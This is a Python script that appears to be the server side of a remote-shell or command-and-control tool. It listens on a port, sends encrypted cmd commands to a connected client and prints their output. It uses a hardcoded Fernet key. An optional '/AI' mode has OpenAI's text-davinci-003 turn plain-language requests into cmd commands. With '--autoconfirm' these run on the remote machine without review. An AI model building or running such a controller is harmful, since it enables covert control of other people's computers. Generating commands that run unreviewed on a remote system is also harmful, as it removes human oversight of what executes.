import socket
import openai
from cryptography.fernet import Fernet

key = b'6wifEyjwf89CwkUweVRcBMxU7ywgba3ayNRAm_0Gq9E='
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(
    (socket.gethostbyname(socket.gethostname()), 1212)
)
s.listen()



def translateToCommand(apiKey, command):
    openai.api_key = apiKey
    confirm = False
    if command[-13:]=="--autoconfirm":
        confirm = True
        command = command[:-13]
    response = openai.Completion.create(
      model="text-davinci-003",
      prompt=f"Convert this text to a programmatic command in cmd: {command}",
      temperature=0,
      max_tokens=1000
    )
    command = response["choices"][0]["text"].strip()
    if confirm:
        return command
    while True:
        ask = input(f"{command}\ny/n")
        if ask == "y":
            return command
        elif ask == "n":
            return False
        

def encrypt(msg,key):
    ferObject = Fernet(key)
    msgEncrypt = ferObject.encrypt(msg)
    return msgEncrypt

def decrypt(msg,key):
    ferObject = Fernet(key)
    msgDecrypt = ferObject.decrypt(msg)
    return msgDecrypt

def sendMsg(conn,msg):
    msg = encrypt(msg, key)
    header = str(len(msg)).encode() #to send to the client the current length of the message
    conn.send(header)
    conn.send(msg) #sending the real message

def readMsg(conn):
    header = conn.recv(5)
    msg = conn.recv(int(header.decode()))
    return decrypt(msg, key).decode()


apiKey = False
while True:
    print("[+] >> Listening!")
    conn, addr = s.accept()
    print(f"[+] >> Connection from {addr[0]} has been established!")
    while True:
        command = input("[+] >> Please enter command to be sent to client \n")
        if command == "close":
            s.close()
        if command.startswith('/AI'):
            if apiKey == False:
                apiKey = input('Please provide API key: ')
            command = translateToCommand(apiKey, command[3:])
        if command != False:
            sendMsg(conn, command.encode())
            out = readMsg(conn)
            print(out)
            
